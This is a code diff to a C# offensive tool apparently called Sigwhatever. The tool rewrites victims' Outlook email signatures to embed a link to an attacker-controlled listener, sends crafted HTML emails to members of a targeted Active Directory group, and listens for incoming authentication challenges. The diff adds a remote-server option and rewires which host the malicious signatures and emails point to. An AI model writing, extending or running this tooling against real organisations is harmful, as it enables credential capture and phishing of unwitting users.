@@ -99,10 +99,13 @@ namespace Sigwhatever
             bool backdoorAll = false;
             bool showHelp = false;
             string hostname = Environment.MachineName;
+            string server = "";
 
             var opt = new OptionSet() {
             { "p|port=", "TCP Port.",
                 v => port = v },
+            { "s|server=", "Remote Server.",
+                v => server = v },
             { "l|log=", "Log file path.",
                 v => logfile = v },
             { "g|group=", "Target Active Directory group.",
@@ -273,9 +276,6 @@ namespace Sigwhatever
             // Initialise some classes and get the local host name for starting the listener
             ClsModSig ModSig = new ClsModSig();
 
-            // Don't use the FQDN because it re-classifies as internet zone.
-            string server = Environment.MachineName;
-
             if (operation == "SIGNATURE")
             {
                 if (string.IsNullOrEmpty(port))
@@ -290,7 +290,7 @@ namespace Sigwhatever
                 if (findexisting.Length > 1)
                 {
                     Console.WriteLine("[+] Just going to mod everything in the folder");
-                    ModSig.ModSignature(server, urlPrefix, port, newsigname, false, existingsig);
+                    ModSig.ModSignature(hostname, urlPrefix, port, newsigname, false, existingsig);
 
                     Console.WriteLine("[+] Done signature mods, starting to listen");
                     StartListening(urlPrefix, port, logfile, argChallenge, force);
@@ -306,7 +306,7 @@ namespace Sigwhatever
                     if (existingsig == null)
                         return;
 
-                    ModSig.ModSignature(server, urlPrefix, port, newsigname, false, existingsig);
+                    ModSig.ModSignature(hostname, urlPrefix, port, newsigname, false, existingsig);
 
                     Console.WriteLine("[+] Done signature mods, starting to listen");
                     Console.WriteLine("[IMPORTANT] The signature change will not take effect until Outlook is restarted, so you'll need to kill the process");
@@ -386,7 +386,7 @@ namespace Sigwhatever
                     return;
                 }
 
-                string bodyhtml = ModSig.MakeNewHTML(server, urlPrefix, port);
+                string bodyhtml = ModSig.MakeNewHTML(hostname, urlPrefix, port);
 
                 ClsOutlook ol = new ClsOutlook();
                 ol.SendEmail(lstEmails, "Empty", bodyhtml);
